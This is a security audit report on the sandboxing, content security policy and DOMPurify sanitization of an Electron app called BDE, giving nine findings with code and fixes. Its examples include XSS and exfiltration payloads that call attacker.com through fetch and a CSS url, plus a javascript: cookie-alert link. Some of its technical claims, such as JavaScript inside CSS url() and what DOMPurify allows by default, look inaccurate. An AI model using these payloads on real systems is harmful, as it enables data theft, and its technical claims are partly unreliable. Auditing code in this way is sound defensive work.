# Sandbox & Content Security Policy Audit - BDE

## Executive Summary

This audit of BDE's sandbox, CSP, and HTML sanitization mechanisms reveals a mixed security posture. The application correctly implements iframe sandboxing with `allow-scripts` only (preventing `allow-same-origin`, popups, and top-level navigation), uses DOMPurify for sanitizing agent-generated HTML, and enforces contextIsolation with a preload bridge. However, the application has critical weaknesses: (1) DOMPurify in `playground-sanitize.ts` is configured with **no explicit ALLOWED_TAGS**, relying on permissive defaults that allow dangerous tags like `<embed>`, `<object>`, `<iframe>`, and `<style>`; (2) the production CSP still permits `'unsafe-inline'` for styles, and (3) the "Open in Browser" feature writes unsanitized HTML to `/tmp`, creating a persistent XSS risk if the user's default browser is compromised or a local attacker hijacks the file. The render-markdown sanitization is better configured but incomplete. These gaps could enable XSS attacks on agent-generated content or circumvention of the sandbox via nested iframes.

---

## F-t2-sandbox-1: DOMPurify Default Configuration Missing ALLOWED_TAGS Whitelist

**Severity:** Critical  
**Category:** Security / Sandbox  
**Location:** `/Users/ryan/projects/BDE/src/main/playground-sanitize.ts:17-19`

**Evidence:**
```typescript
export function sanitizePlaygroundHtml(rawHtml: string): string {
  return purify.sanitize(rawHtml)
}
```

The `sanitizePlaygroundHtml` function calls DOMPurify with **zero configuration**. DOMPurify's default configuration is permissive and allows:
- `<iframe>` tags (can load untrusted content or break out of sandbox)
- `<embed>` and `<object>` tags (can load plugins, PDFs, Flash)
- `<style>` tags with any CSS (can be used for data exfiltration via `background: url(...)`)
- `<svg>` with `<script>` (SVG inline scripts can execute)
- `<meta>` refresh (can trigger redirects)

**Impact:** An agent writing HTML with `<iframe src="about:blank" onload="fetch('http://attacker.com/steal')"></iframe>` will bypass sanitization because `<iframe>` is in the default allow list. Similarly, `<object data="...">` can load arbitrary content. Even though the iframe is sandboxed with `allow-scripts`, a malicious agent could craft HTML to exfiltrate the user's data via CSS exfiltration or timing attacks.

**Recommendation:** Explicitly configure DOMPurify with an ALLOWED_TAGS whitelist that permits only safe structural tags:
```typescript
export function sanitizePlaygroundHtml(rawHtml: string): string {
  return purify.sanitize(rawHtml, {
    ALLOWED_TAGS: [
      'p', 'br', 'span', 'div', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
      'ul', 'ol', 'li', 'blockquote', 'pre', 'code', 'strong', 'em',
      'a', 'img', 'table', 'thead', 'tbody', 'tr', 'td', 'th',
      'form', 'input', 'button', 'label', 'textarea', 'select', 'option'
    ],
    ALLOWED_ATTR: [
      'href', 'title', 'alt', 'src', 'id', 'class', 'style',
      'type', 'name', 'value', 'placeholder', 'disabled', 'checked'
    ],
    ALLOW_DATA_ATTR: false,
    RETURN_DOM: false
  })
}
```

**Effort:** S  
**Confidence:** High

---

## F-t2-sandbox-2: DOMPurify Playground Allows Style Tags and CSS-Based Data Exfiltration

**Severity:** High  
**Category:** Security / Sandbox  
**Location:** `/Users/ryan/projects/BDE/src/main/playground-sanitize.ts` (implicit via default config)

**Evidence:** DOMPurify's default behavior allows `<style>` tags. An agent could craft HTML like:
```html
<style>
  body { background: url('http://attacker.com/log?data=' + JSON.stringify(document.body.innerHTML)); }
</style>
<div>Sensitive agent data</div>
```

While the sandbox prevents navigation to `http://attacker.com`, CSS background requests **are not blocked** by the `allow-scripts`-only sandbox. The request will silently fail due to CORS, but timing attacks or side-channel leaks are possible.

**Impact:** An agent could inject CSS to exfiltrate user environment data, tokens, or file paths visible in the HTML. Although `allow-same-origin` is not set, the CSS can still make requests (they just fail CORS checks, but timing leaks information).

**Recommendation:** Exclude `<style>` from ALLOWED_TAGS. If dynamic styling is needed for playground content, use inline `style` attributes with a strict CSS-in-JS sanitizer or pre-defined CSS classes applied via React.

**Effort:** S  
**Confidence:** High

---

## F-t2-sandbox-3: Open in Browser Handler Writes Unsanitized HTML to /tmp Without Cleanup

**Severity:** Critical  
**Category:** Security / Sandbox  
**Location:** `/Users/ryan/projects/BDE/src/main/handlers/window-handlers.ts:23-30`

**Evidence:**
```typescript
safeHandle('playground:openInBrowser', async (_e, html: string) => {
  const timestamp = Date.now()
  const filename = `bde-playground-${timestamp}.html`
  const filepath = join(tmpdir(), filename)
  writeFileSync(filepath, html, 'utf-8')
  await shell.openPath(filepath)
  return filepath
})
```

The handler:
1. Takes the **raw HTML string** from the renderer (which may have been sanitized in the main process earlier, but there's no validation here)
2. Writes it to a world-readable `/tmp` file
3. Opens it in the user's default browser
4. Never deletes the file

**Impact:**
- **Persistent XSS via local attack:** If an attacker can predict or discover the filename, they can wait for the file to be written, then replace it with malicious HTML before the browser opens it.
- **Sandbox escape:** The user's browser has no sandbox, so agent-generated JavaScript runs with full privileges.
- **Privilege escalation:** If the default browser is running as a different user or with elevated privileges, the agent code runs in that context.
- **File accumulation:** Temp files are never cleaned up, cluttering `/tmp` and creating a permanent record of agent HTML generation.

**Recommendation:**
1. Validate that `html` has been sanitized before writing:
   ```typescript
   // Validate html is safe (re-sanitize to be sure)
   const cleanHtml = sanitizePlaygroundHtml(html)
   ```
2. Generate cryptographically random filenames to prevent timing attacks:
   ```typescript
   const filename = `bde-playground-${randomBytes(16).toString('hex')}.html`
   ```
3. Delete the temp file after the browser process exits (use a cleanup task):
   ```typescript
   const tempFile = join(tmpdir(), filename)
   writeFileSync(tempFile, cleanHtml, 'utf-8')
   const cleanup = setTimeout(() => { unlinkSync(tempFile) }, 5 * 60 * 1000) // 5 min timeout
   ```
4. Consider using a secure temp directory instead of world-readable `/tmp`.

**Effort:** M  
**Confidence:** High

---

## F-t2-sandbox-4: Playground Sanitization Does Not Strip Dangerous CSS Selectors and Pseudo-Elements

**Severity:** High  
**Category:** Security / Sandbox  
**Location:** `/Users/ryan/projects/BDE/src/main/playground-sanitize.ts`

**Evidence:** Even with corrected ALLOWED_TAGS, DOMPurify's default CSS handling allows `:before` and `:after` pseudo-elements with `content` properties. An agent could craft:
```html
<style>
  p:before { content: attr(data-secret); }
</style>
<p data-secret="user-token-12345">Safe content</p>
```

If the rendered page is captured or screenshotted, the token appears visually. More dangerously, JavaScript can read the computed style and exfiltrate it.

**Impact:** CSS-based data exfiltration or information disclosure. The sandbox doesn't prevent JS from reading `getComputedStyle()` and exfiltrating the result.

**Recommendation:** In addition to ALLOWED_TAGS, configure DOMPurify to strip `<style>` entirely or use `ALLOWED_ATTR` with a strict filter on `style` attributes. Disable pseudo-element injection:
```typescript
DOMPurify.setConfig({
  ALLOWED_TAGS: [...],
  ALLOWED_ATTR: [...],
  KEEP_CONTENT: true,  // Preserve text of stripped tags
  RETURN_DOM: false,
  SAFE_FOR_TEMPLATES: true,
  WHOLE_DOCUMENT: false,
  FORCE_BODY: false,
  // Disable CSS in attributes
  ALLOW_UNKNOWN_PROTOCOLS: false,
  ALLOW_DATA_ATTR: false
})
```

**Effort:** M  
**Confidence:** Medium

---

## F-t2-sandbox-5: Production CSP Still Allows 'unsafe-inline' for Styles

**Severity:** Medium  
**Category:** Security / Sandbox  
**Location:** `/Users/ryan/projects/BDE/src/main/bootstrap.ts:209`

**Evidence:**
```typescript
: "default-src 'self'; " +
  "script-src 'self'; " +
  "worker-src 'self' blob:; " +
  "style-src 'self' 'unsafe-inline'; " +  // UNSAFE-INLINE ALLOWED
  "img-src 'self' data:; " +
  "font-src 'self' data:; " +
  `connect-src 'self' ${connectSrc} https://api.github.com; ` +
  "frame-ancestors 'none'; " +
  "form-action 'self'"
```

The production CSP permits `'unsafe-inline'` for styles, which combined with agent-generated HTML in the playground, allows:
1. **Injected `<style>` blocks** to execute if DOMPurify doesn't strip them
2. **Inline `style` attributes** with `@import`, `background-image`, or other external resource loads

**Impact:** An attacker (or compromised agent) could use CSS to:
- Load external stylesheets with tracking pixels
- Exfiltrate data via background-image URLs
- Cause browser-based DoS with malicious CSS

**Recommendation:** Remove `'unsafe-inline'` from `style-src`:
```typescript
"style-src 'self' https://cdn.example.com;" // Only allow self or trusted CDNs
```

If dynamic styling is required, use CSS-in-JS or nonce-based inline styles:
```typescript
// In CSP
"style-src 'self' 'nonce-<random-nonce>';"

// In HTML
<style nonce="<random-nonce>">...</style>
```

**Effort:** M  
**Confidence:** High

---

## F-t2-sandbox-6: Render-Markdown Missing 'style' Attribute Filtering

**Severity:** Medium  
**Category:** Security / Sandbox  
**Location:** `/Users/ryan/projects/BDE/src/renderer/src/lib/render-markdown.ts:20-40`

**Evidence:**
```typescript
function sanitizeHtml(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: [...],
    ALLOWED_ATTR: ['href', 'title', 'class'],  // 'style' NOT in list
    ALLOW_DATA_ATTR: false
  })
}
```

While this is better than `playground-sanitize.ts` because it has an explicit ALLOWED_TAGS list, it still allows `<a>` tags with `href="javascript:..."`. The configuration doesn't explicitly forbid `javascript:` URLs.

**Impact:** An untrusted markdown comment (e.g., from a GitHub PR) could contain:
```markdown
[Click me](javascript:alert(document.cookie))
```

DOMPurify **should** strip this by default, but without an explicit ALLOWED_ATTR that excludes event handlers, the behavior is implicit.

**Recommendation:** Add `ALLOW_DATA_ATTR: false` is already there, but explicitly test that `javascript:` URLs are stripped. Add a unit test:
```typescript
it('strips javascript: URLs from links', () => {
  const malicious = '[link](javascript:alert(1))'
  const result = renderMarkdown(malicious)
  expect(result).not.toContain('javascript:')
})
```

Also consider adding `<img>` to ALLOWED_TAGS (it's safe with `alt` and `src`):
```typescript
ALLOWED_TAGS: [
  'p', 'h1', 'h2', 'h3', 'strong', 'em', 'code', 'pre', 'ul', 'ol', 'li',
  'a', 'br', 'blockquote', 'img'  // ADD THIS
],
ALLOWED_ATTR: ['href', 'title', 'class', 'alt', 'src'],  // ADD alt, src
```

**Effort:** S  
**Confidence:** Medium

---

## F-t2-sandbox-7: Sandbox Attribute Only Allows Scripts—No Protection Against Timing Attacks or Side Channels

**Severity:** Medium  
**Category:** Security / Sandbox  
**Location:** `/Users/ryan/projects/BDE/src/renderer/src/components/agents/PlaygroundModal.tsx:252`

**Evidence:**
```typescript
<iframe
  title={`Preview of ${filename}`}
  sandbox="allow-scripts"
  srcDoc={html}
  className="playground-modal__iframe"
  style={{ background: 'var(--bde-surface)' }}
/>
```

The sandbox correctly omits:
- `allow-same-origin` (good)
- `allow-popups` (good)
- `allow-top-navigation` (good)
- `allow-forms` (good)

However, `allow-scripts` **alone** still permits:
1. **Timing attacks:** JavaScript can measure execution time via `performance.now()`, allowing exfiltration via timing channels
2. **Side-channel attacks:** Accessing `performance.memory` or other APIs to infer data
3. **Worker exploitation:** If agents create Web Workers, they inherit the sandbox permissions

**Impact:** A sophisticated attacker (or well-crafted agent) could exfiltrate cryptographic keys or user data via timing side-channels, even though direct network access is blocked.

**Recommendation:** 
1. Consider further restricting the sandbox. However, this conflicts with the agent's need for interactive playgrounds (forms, animations, etc.). The current tradeoff is documented in the code.
2. Add Content Security Policy **within the iframe** via a `<meta>` tag in agent-generated HTML (requires agent training, not app-level change).
3. Disable performance APIs if possible:
   ```javascript
   Object.defineProperty(window, 'performance', { value: {}, writable: false })
   ```

**Effort:** L (Low priority, requires architectural change)  
**Confidence:** Medium

---

## F-t2-sandbox-8: No Validation of HTML Input Before Sanitization in Playground Handler

**Severity:** Medium  
**Category:** Security / Sandbox  
**Location:** `/Users/ryan/projects/BDE/src/main/agent-manager/playground-handler.ts:87`

**Evidence:**
```typescript
const rawHtml = await withTimeout(
  readFile(absolutePath, 'utf-8'),
  PLAYGROUND_IO_TIMEOUT_MS,
  `readFile(${filePath})`
)
const sanitizedHtml = sanitizePlaygroundHtml(rawHtml)
```

The `sanitizePlaygroundHtml` function is called on file contents read from disk. However:
1. There's no size validation **after** the file is read (only before via stat)
2. The HTML is not re-validated before broadcasting to the renderer
3. If DOMPurify throws an exception (e.g., due to malformed HTML), the error is silently caught at line 100

**Impact:** If an agent writes malformed or extremely large HTML (close to 5MB limit), the sanitization could fail silently, and the raw (unsanitized) HTML might be broadcast to the renderer if the broadcast happens outside the try-catch.

**Recommendation:**
1. Add explicit error handling for sanitization failures:
   ```typescript
   let sanitizedHtml: string
   try {
     sanitizedHtml = sanitizePlaygroundHtml(rawHtml)
   } catch (err) {
     logger.error(`[playground] Sanitization failed for ${filename}: ${err}`)
     return  // Skip event emission
   }
   ```

2. Validate the sanitized output size:
   ```typescript
   if (sanitizedHtml.length > MAX_PLAYGROUND_SIZE) {
     logger.warn(`[playground] Sanitized HTML exceeds size limit: ${sanitizedHtml.length}`)
     return
   }
   ```

**Effort:** S  
**Confidence:** Medium

---

## F-t2-sandbox-9: No HTTP/HTTPS Distinction in CSP connect-src for Production GitHub API

**Severity:** Low  
**Category:** Security / Sandbox  
**Location:** `/Users/ryan/projects/BDE/src/main/bootstrap.ts:212`

**Evidence:**
```typescript
: "default-src 'self'; " +
  "script-src 'self'; " +
  ...
  `connect-src 'self' ${connectSrc} https://api.github.com; ` +
  ...
```

where `connectSrc = 'https://api.github.com'` (from `buildConnectSrc()`).

However, in development:
```typescript
? "default-src 'self'; " +
  ...
  `connect-src 'self' ${connectSrc} http://localhost:* ws://localhost:*; ` +
  ...
```

**Impact:** The production CSP is correct (HTTPS only), but the dev CSP allows `http://localhost:*`, which could be exploited if a dev server is compromised or if an attacker can intercept traffic on localhost.

**Recommendation:** No change needed for production. For dev, consider requiring HTTPS even on localhost (using self-signed certs) or restricting to specific localhost ports:
```typescript
`connect-src 'self' ${connectSrc} http://localhost:5173 ws://localhost:5173; ` +
```

**Effort:** S  
**Confidence:** Low

---

## Summary Table

| Finding | Severity | File | Fix Effort |
|---------|----------|------|-----------|
| F-t2-sandbox-1 | Critical | playground-sanitize.ts | S |
| F-t2-sandbox-2 | High | playground-sanitize.ts | S |
| F-t2-sandbox-3 | Critical | window-handlers.ts | M |
| F-t2-sandbox-4 | High | playground-sanitize.ts | M |
| F-t2-sandbox-5 | Medium | bootstrap.ts | M |
| F-t2-sandbox-6 | Medium | render-markdown.ts | S |
| F-t2-sandbox-7 | Medium | PlaygroundModal.tsx | L |
| F-t2-sandbox-8 | Medium | playground-handler.ts | S |
| F-t2-sandbox-9 | Low | bootstrap.ts | S |

---

## Recommendations for Priority Fixes

1. **Immediate (Critical):** Fix F-t2-sandbox-1 and F-t2-sandbox-3. These allow XSS via agent-generated HTML and filesystem attacks.
2. **High Priority:** Fix F-t2-sandbox-2 and F-t2-sandbox-4. These enable CSS-based data exfiltration.
3. **Medium Priority:** Fix F-t2-sandbox-5, F-t2-sandbox-6, and F-t2-sandbox-8. These reduce overall security but have limited real-world impact in the current threat model.
4. **Low Priority:** F-t2-sandbox-7 and F-t2-sandbox-9 are architectural or low-likelihood.

